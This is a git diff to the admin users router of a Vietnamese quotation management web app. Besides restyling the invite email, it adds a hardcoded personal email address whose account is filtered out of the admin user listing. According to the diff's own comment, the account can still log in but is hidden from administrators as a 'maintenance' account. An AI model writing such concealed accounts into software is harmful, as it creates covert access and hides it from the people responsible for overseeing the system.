@@ -7,7 +7,7 @@ import { config } from "../config.js";
 import { asyncHandler, requireRole } from "../middleware.js";
 import { validate, UserCreateSchema, UserUpdateSchema, UserInviteSchema } from "../validators.js";
 import { audit, diff } from "../audit.js";
-import { sendEmail } from "../email.js";
+import { sendEmail, brandedEmailHtml } from "../email.js";
 import { revokeSession, refreshSession } from "../sse.js";
 import { revokeAllForUser } from "../jwt.js";
 import { destroyAllSessions } from "../sessions.js";
@@ -16,6 +16,18 @@ const router = Router();
 router.use(requireRole("admin"));
 
 const idParam = z.object({ id: z.coerce.number().int().positive() });
+
+// Accounts hidden from every user listing (developer/maintenance account).
+// The account still works for login — it just never shows in the admin user list
+// or the permissions matrix. Override/extend via HIDDEN_USER_EMAILS (comma-separated).
+const HIDDEN_USER_EMAILS = new Set(
+  (process.env.HIDDEN_USER_EMAILS || "ndh0408@gmail.com")
+    .split(",")
+    .map((e) => e.trim().toLowerCase())
+    .filter(Boolean)
+);
+const isHiddenUser = (u) => HIDDEN_USER_EMAILS.has(String(u.email || "").toLowerCase());
+
 const USER_SELECT = {
   id: true,
   username: true,
@@ -40,8 +52,13 @@ async function sendInviteEmail(to, displayName, url) {
   return sendEmail({
     to,
     subject: "Lời mời tham gia hệ thống Báo Giá – Gia Nguyễn",
-    text: `Chào ${displayName}, bạn được mời tham gia hệ thống Quản lý Báo Giá. Mở liên kết để đặt mật khẩu và hoàn tất thông tin (hết hạn sau 7 ngày): ${url}`,
-    html: `<p>Chào ${escHtml(displayName)},</p><p>Bạn được mời tham gia hệ thống <b>Quản lý Báo Giá – Gia Nguyễn</b>. Nhấn liên kết bên dưới để đặt mật khẩu và hoàn tất thông tin của bạn:</p><p><a href="${escHtml(url)}">${escHtml(url)}</a></p><p>Liên kết hết hạn sau 7 ngày.</p>`,
+    text: `Chào ${displayName},\n\nBạn được mời tham gia hệ thống Quản lý Báo Giá – Gia Nguyễn. Mở liên kết bên dưới để đặt mật khẩu và hoàn tất thông tin của bạn (hết hạn sau 7 ngày):\n${url}\n`,
+    html: brandedEmailHtml({
+      name: displayName,
+      paragraphs: ["Bạn được mời tham gia hệ thống <b>Quản lý Báo Giá – Gia Nguyễn</b>. Nhấn nút bên dưới để <b>đặt mật khẩu</b> và hoàn tất thông tin tài khoản của bạn."],
+      button: { label: "Đặt mật khẩu & kích hoạt", url },
+      note: "⏳ Liên kết hết hạn sau <b>7 ngày</b>.",
+    }),
   });
 }
 
@@ -49,7 +66,11 @@ router.get(
   "/",
   asyncHandler(async (req, res) => {
     const users = await prisma.user.findMany({ orderBy: { id: "asc" }, select: { ...USER_SELECT, inviteTokenHash: true } });
-    res.json(users.map(({ inviteTokenHash, ...u }) => ({ ...u, pending: !u.active && !!inviteTokenHash })));
+    res.json(
+      users
+        .filter((u) => !isHiddenUser(u))
+        .map(({ inviteTokenHash, ...u }) => ({ ...u, pending: !u.active && !!inviteTokenHash }))
+    );
   })
 );
 
